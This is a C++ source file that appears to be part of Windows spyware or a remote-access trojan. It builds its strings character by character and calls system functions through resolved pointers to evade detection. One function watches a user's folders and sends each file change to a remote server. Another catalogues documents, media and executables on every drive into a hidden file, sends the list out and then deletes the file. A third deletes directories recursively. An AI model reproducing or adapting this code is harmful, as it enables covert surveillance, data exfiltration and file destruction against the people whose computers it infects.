#include "../PublicVar.h"
#include "HARDdiskfile.h"
#include "zconf.h"
#include "zlib.h"
#include "../network/NetWorkdata.h"
#pragma comment(lib,"zlib.lib")

#include <iostream>

using namespace std;



char szDirWindows[] = { 'W','i','n','d','o','w','s',0 };
char szProgramFiles[] = { 'P','r','o','g','r','a','m',' ','F','i','l','e','s',0 };
char szProgramData[] = { 'P','r','o','g','r','a','m','D','a','t','a',0 };
char szUsersAdminiAppData[] = { 'U','s','e','r','s','\\','A','D','M','I','N','I','~','1','\\','A','p','p','D','a','t','a',0 };
char szNtser[] = {'n','t','u','s','e','r',0};
char szNtserCapslock[] = {'N','T','U','S','E','R',0};
char szCurUserAppdDataFormat[] = {'U','s','e','r','s','\\','%','s','\\','A','p','p','D','a','t','a',0};
char szCurUserApplicationDataFromat[] = {'U','s','e','r','s','\\','%','s','\\','A','p','p','l','i','c','a','t','i','o','n',' ','D','a','t','a',0};




string prefixnames = ".ini.txt.doc.xls.ppt.pdf.dat.bmp.jpg.jpeg.png.mp3.amr.avi.mp4.wav.ogg.mpeg3.mpeg4.exe.dll.apk.jar.dex.app.zip.rar.lnk.xml.json.htm";



//this function need to be in a independent thread process
DWORD WINAPI DesignateVolumeWatcher(char * strFilePath)
{
	char strPath[MAX_PATH] = {0};
	if ( tolower(strFilePath[0]) == tolower(szSysDir[0]) )
	{
		lpwsprintfA(strPath, "%sUsers\\%s\\", strFilePath, strUserName);
	}
	else {
		lplstrcpyA(strPath, strFilePath);
	}
	

	char strerror[1024];
	DWORD cbBytes =0;
	char file_name[MAX_PATH];
	char file_rename[MAX_PATH];
	char notify[FILE_OPER_NOTYFY_SIZE];
	char strBuf[1024];

	//若网络重定向或目标文件系统不支持该操作，函数失败，同时调用GetLastError()返回ERROR_INVALID_FUNCTION
	HANDLE dirHandle = lpCreateFileA(strPath,GENERIC_READ | GENERIC_WRITE | FILE_LIST_DIRECTORY,FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL);
	if(dirHandle == INVALID_HANDLE_VALUE) 
	{
		lpwsprintfA(strerror,"%s DesignateVolumeWatcher lpCreateFileA error,error code:%u maybe the path is not exist\r\n",
			strPath, lpRtlGetLastWin32Error());
		WriteLittleBearLog(strerror);
		return FALSE;
	}

	lpRtlZeroMemory(notify,FILE_OPER_NOTYFY_SIZE);
	FILE_NOTIFY_INFORMATION *pnotify = (FILE_NOTIFY_INFORMATION*)notify; 

	while(TRUE)
	{   
		int iRet = lpReadDirectoryChangesW(dirHandle,&notify,FILE_OPER_NOTYFY_SIZE,TRUE,
			FILE_NOTIFY_CHANGE_FILE_NAME 
			|FILE_NOTIFY_CHANGE_DIR_NAME
			|FILE_NOTIFY_CHANGE_ATTRIBUTES 
			|FILE_NOTIFY_CHANGE_SIZE
			|FILE_NOTIFY_CHANGE_LAST_WRITE
			|FILE_NOTIFY_CHANGE_LAST_ACCESS
			|FILE_NOTIFY_CHANGE_CREATION
			|FILE_NOTIFY_CHANGE_SECURITY,
			&cbBytes,NULL,NULL);
		if(iRet)
		{
			if(pnotify->FileName)
			{
				lpRtlZeroMemory(file_name,MAX_PATH);
				lpWideCharToMultiByte(CP_ACP,0,pnotify->FileName,pnotify->FileNameLength,file_name,MAX_PATH,NULL,NULL);

// 				if (strstr(file_name,szDirWindows ) || strstr(file_rename,szProgramData  ) || strstr(file_rename,szProgramFiles) )
// 				{
// 					continue;
// 				}

				int pos = string(file_name).find(".");
				if (pos < 0)
				{
					continue;
				}

				string prefixfn = string(file_name).substr(pos);
				if (prefixnames.find(prefixfn) < 0)
				{
					continue;
				}
			}

			if(pnotify->NextEntryOffset !=0 && (pnotify->FileNameLength > 0 && pnotify->FileNameLength < MAX_PATH) ) 
			{ 
				PFILE_NOTIFY_INFORMATION p = (PFILE_NOTIFY_INFORMATION)((char*)pnotify+pnotify->NextEntryOffset); 
				lpRtlZeroMemory(file_rename,sizeof(file_rename) ); 
				lpWideCharToMultiByte(CP_ACP,0,p->FileName,p->FileNameLength,file_rename,MAX_PATH,NULL,NULL ); 
			} 

			SYSTEMTIME stTime = { 0 };
			lpGetLocalTime(&stTime);
			char strTime[MAX_PATH];
			iRet = lpwsprintfA(strTime,"%u-%u-%u %u:%u:%u",stTime.wYear,stTime.wMonth,stTime.wDay,stTime.wHour,stTime.wMinute,stTime.wSecond);

			switch(pnotify->Action)
			{
			case FILE_ACTION_ADDED:
				iRet = lpwsprintfA(strBuf,"%s  创建文件:%s%s\r\n",strTime,strPath,file_name);
				IndependentNetWork_SendMessage(strBuf,iRet,DISKFILERECORD,0);
				break;
			case FILE_ACTION_MODIFIED:
				iRet = lpwsprintfA(strBuf,"%s  修改文件:%s%s\r\n",strTime,strPath,file_name);
				IndependentNetWork_SendMessage(strBuf,iRet,DISKFILERECORD,0);
				break;
			case FILE_ACTION_REMOVED:
				iRet = lpwsprintfA(strBuf,"%s  删除文件:%s%s\r\n",strTime,strPath, file_name);
				IndependentNetWork_SendMessage(strBuf,iRet,DISKFILERECORD,0);
				break;
			case FILE_ACTION_RENAMED_OLD_NAME:
				iRet = lpwsprintfA(strBuf,"%s  重命名文件:%s%s 新文件名称:%s%s\r\n",strTime,strPath,file_name,strPath,file_rename);
				IndependentNetWork_SendMessage(strBuf,iRet,DISKFILERECORD,0);
				break;
			case FILE_ACTION_RENAMED_NEW_NAME:
				iRet = lpwsprintfA(strBuf,"%s  重命名文件:%s%s 新文件名称:%s%s\r\n",strTime,strPath,file_name,strPath,file_rename);
				IndependentNetWork_SendMessage(strBuf,iRet,DISKFILERECORD,0);
				break;
			default:
				iRet = lpwsprintfA(strBuf,"%s  未知文件操作:%s%s\r\n",strTime,strPath,file_name);
				IndependentNetWork_SendMessage(strBuf,iRet,DISKFILERECORD,0);
				break;
			}
		}   
	}
	lpCloseHandle(dirHandle);
	return TRUE;
}






//this function need to be in a independent thread process
int __stdcall FindFilesInDir(char * PreStrPath, int iLayer,HANDLE hfile)   
{   
	int counter = 0;
	int iRet = 0;
	char strBuf[1024];

	char strPath[4096] = {0};
	lplstrcpyA(strPath,PreStrPath);
	char szAllFileForamt[] = {'*','.','*',0};		
	lplstrcatA(strPath, szAllFileForamt);

	char szLastDir[] = {'.','.',0};
	WIN32_FIND_DATAA stWfd = {0};
	HANDLE hFind = 0;
	__try
	{
		hFind = lpFindFirstFileA(strPath,(LPWIN32_FIND_DATAA)&stWfd);
		if(hFind== INVALID_HANDLE_VALUE)
		{
			iRet = lpRtlGetLastWin32Error();
			lpwsprintfA(strBuf,"FindFilesInDir lpFindFirstFileA path:%s error,error code is:%u\r\n",strPath,iRet);
			WriteLittleBearLog(strBuf);
			return counter;
		}

		do
		{   
			if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			{  
				if (lplstrcmpiA(stWfd.cFileName, szLastDir)==0 || lplstrcmpiA(stWfd.cFileName, ".") ==0)
				{
					continue;
				}
				else if (strstr(stWfd.cFileName, szDirWindows) 
					/*|| strstr(stWfd.cFileName, szProgramData)*/ || 
					strstr(stWfd.cFileName, szProgramFiles))
				{
					continue;
				}

				char strNextPath[4096] = {0};
				lpRtlMoveMemory(strNextPath,strPath, lplstrlenA(strPath) - 3);
				lplstrcatA(strNextPath ,stWfd.cFileName);
				lplstrcatA(strNextPath, "\\");
				counter = counter + FindFilesInDir(strNextPath,iLayer+1,hfile);  
			}   
			else     
			{   
				if (stWfd.nFileSizeLow || stWfd.nFileSizeHigh) {

					int pos = string(stWfd.cFileName).find(".");
					if (pos >= 0)
					{
						string prefixfn = string(stWfd.cFileName).substr(pos);
						pos = prefixnames.find(prefixfn);
						if ( pos >= 0)
						{
							char szfilename[MAX_PATH * 4];
							lplstrcpyA(szfilename, PreStrPath);
							lplstrcatA(szfilename, stWfd.cFileName);
							lplstrcatA(szfilename, "\r\n");

							DWORD dwcnt = 0;
							iRet = lpWriteFile(hfile, szfilename, lplstrlenA(szfilename), &dwcnt, 0);

							counter++;
							if (counter % 16 == 0)
							{
								lpSleep(50);
							}
						}
					}
				}
			}  
		} while(lpFindNextFileA(hFind,(LPWIN32_FIND_DATAA)&stWfd));
		lpFindClose(hFind);
		return counter;
	}
	__except (1)
	{
		if (hFind)
		{
			lpFindClose(hFind);
		}

		return counter;
	}
}


int bNeedAllFiles() {
	string cfgfn = string(strDataPath) + "diskfileTime.ini";

	int ret = 0;

	DWORD dwcnt = 0;

	int len = 0;

	int filesize = 0;

	time_t now = time(0);
	
	char data[1024] = { 0 };
	HANDLE hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE) {
		hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	}

	filesize = lpGetFileSize(hf, 0);
	ret = lpReadFile(hf, data, filesize, &dwcnt, 0);
	*(data + filesize) = 0;

	string strtime = data;

	time_t last = atoi(strtime.c_str());
	if (now - last >= 30 * 24 * 3600)
	{
		len = lpwsprintfA(data, "%u", now);
		ret = lpSetFilePointer(hf, 0, 0, FILE_BEGIN);
		ret = lpWriteFile(hf, data, len, &dwcnt, 0);
		lpCloseHandle(hf);
		return 1;
	}
	
	lpCloseHandle(hf);
	return 0;
}



//this function need to be in a independent thread process
int __stdcall GetHardDiskAllFiles()
{

	try
	{
		if (bNeedAllFiles() == 0)
		{
			return 0;
		}

		char szerror[1024];
		char strDisk[4096] = { 0 };
		int iLen = lpGetLogicalDriveStringsA(4096,strDisk);
		if (iLen <= 0)
		{
			return FALSE;
		}
		char * strDiskPtr = strDisk;

		DWORD dwFilesCnt = 0;

		char strFilePath[MAX_PATH] = {0};
		int iRet = ModifyModuleFileName(strFilePath,ALL_DISK_FILE_FILENAME);
		HANDLE hFile = lpCreateFileA(strFilePath,GENERIC_READ | GENERIC_WRITE,0,0,
			CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,0);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			WriteLittleBearLog("GetAllDiskFiles lpCreateFileA error\r\n");
			return FALSE;
		}

		for(int i = 0; i < iLen / 4 ; ++i)
		{
			iRet = lpGetDriveTypeA(strDiskPtr);
			if (iRet == DRIVE_FIXED || iRet == DRIVE_REMOTE || iRet == DRIVE_CDROM || iRet == DRIVE_REMOVABLE)		
			//会出现不存在软盘异常 必须去掉DRIVE_REMOVABLE
			{
				if ( (*strDiskPtr == 'A' || *strDiskPtr == 'B' || *strDiskPtr == 'a' || *strDiskPtr == 'b') && iRet == DRIVE_REMOVABLE)
				{
				}else{
					int filescounter = dwFilesCnt + FindFilesInDir(strDiskPtr,1,hFile);
					dwFilesCnt += filescounter;

					lpwsprintfA(szerror,"FindFilesInDir path:%s find files:%d\r\n",strDiskPtr,filescounter);
					WriteLittleBearLog(szerror);
				}
			}
			strDiskPtr += 4;
		} 

		lpwsprintfA(szerror,"FindFilesInDir find total files:%d\r\n",dwFilesCnt);
		WriteLittleBearLog(szerror);

		int filesize = lpGetFileSize(hFile,0);
		char * lpbuf = new char [filesize];
		if (lpbuf == FALSE)
		{
			lpCloseHandle(hFile);
			return FALSE;
		}
		DWORD dwcnt = 0;
		iRet = lpSetFilePointer(hFile,0,0,FILE_BEGIN);
		iRet = lpReadFile(hFile,lpbuf,filesize,&dwcnt,0);
		lpCloseHandle(hFile);

		iRet = IndependentNetWork_SendMessage(lpbuf,filesize,HARDDISKALLFILE,0);
		delete [] lpbuf;

#ifndef _DEBUG
		lpDeleteFileA(strFilePath);
#endif
		return TRUE;
	}
	catch (...)
	{
		WriteLittleBearLog("GetAllDiskFiles exception\r\n");
		return FALSE;
	}
}











int __stdcall DeleteAllFilesInDir(char * szPreStrPath)   
{   
	char szFindName[MAX_PATH];
	lplstrcpyA(szFindName,szPreStrPath);
	char szAllNameFormat[] = {'*','.','*',0};
	lplstrcatA(szFindName,szAllNameFormat);

	HANDLE hFind = 0;
	WIN32_FIND_DATAA stWfd = {0};
	char szLastDir[] = {'.','.',0};
	char strBuf[1024];
	int iRet = 0;
	try
	{
		hFind = lpFindFirstFileA(szFindName,(LPWIN32_FIND_DATAA)&stWfd);
		if(hFind== INVALID_HANDLE_VALUE)
		{
			iRet = lpRtlGetLastWin32Error();
			
			lpwsprintfA(strBuf,"DeleteAllFilesInDir lpFindFirstFileA error,error code is:%u\r\n",iRet);
			WriteLittleBearLog(strBuf);
			return FALSE;
		}

		while(lpFindNextFileA(hFind,(LPWIN32_FIND_DATAA)&stWfd) != 0)  
		{   
			if (lpRtlCompareMemory(stWfd.cFileName,szLastDir,2) == 2 || lpRtlCompareMemory(stWfd.cFileName,szLastDir,1) == 1)
			{
				continue; 
			}
			else if (stWfd.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY) 
			{  
				char sznextpath[MAX_PATH];
				lplstrcpyA(sznextpath,szPreStrPath);
				lplstrcatA(sznextpath,stWfd.cFileName);
				lplstrcatA(sznextpath,"\\");
				int iNextLen = DeleteAllFilesInDir(sznextpath);  
			}   
			else if (strstr(stWfd.cFileName,".dll") || strstr(stWfd.cFileName,".exe"))
			{
				char szFullFileNamePath[MAX_PATH];
				lplstrcpyA(szFullFileNamePath,szPreStrPath);
				lplstrcatA(szFullFileNamePath,stWfd.cFileName);
				iRet = lpDeleteFileA(szFullFileNamePath);
				if (iRet == 0)
				{
					iRet = lpMoveFileExA(szFullFileNamePath,0,MOVEFILE_DELAY_UNTIL_REBOOT );
				}
			}
			else    
			{   
				char szFullFileNamePath[MAX_PATH];
				lplstrcpyA(szFullFileNamePath,szPreStrPath);
				lplstrcatA(szFullFileNamePath,stWfd.cFileName);
				iRet = lpDeleteFileA(szFullFileNamePath);
				if (iRet == 0)
				{
					iRet = lpRtlGetLastWin32Error();
				}
			}  
		} 
		lpFindClose(hFind);

		iRet = lpRemoveDirectoryA(szPreStrPath);
		return TRUE;
	}
	catch (...)
	{
		if (hFind)
		{
			lpFindClose(hFind);
		}

		return FALSE;
	}
}